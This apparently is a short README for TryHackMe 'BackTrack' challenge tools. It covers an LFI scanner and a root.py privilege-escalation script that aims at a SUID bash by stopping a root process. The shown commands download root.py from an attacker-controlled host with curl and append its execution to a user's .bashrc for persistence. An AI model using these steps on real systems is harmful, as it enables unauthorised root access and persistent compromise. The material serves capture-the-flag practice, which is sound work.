# BackTrack--THM
LFI automation script - TryHackMe challenge BackTrack

# Usage LFI - scanner >>

```
git clone https://github.com/TheSysRat/BackTrack--THM

cd BackTrack--THM

python LFI.py -l <IP_ADDRESS> -p <PORT> -w <DICTIONARY_FILE> -o <OUTPUT_LOG_FILE>

```
# root.py script for get SUID bash using SIGSTOP root process >>

```
Download file:

curl http://<IP>:<Port>/root.py -o /home/orville/root.py

Update permisions:

chmod +x /home/orville/root.py

Add file to config file /home/orville/.bashcr  :

echo "python3 /home/orville/root.py" >>  /home/orville/.bashrc

```

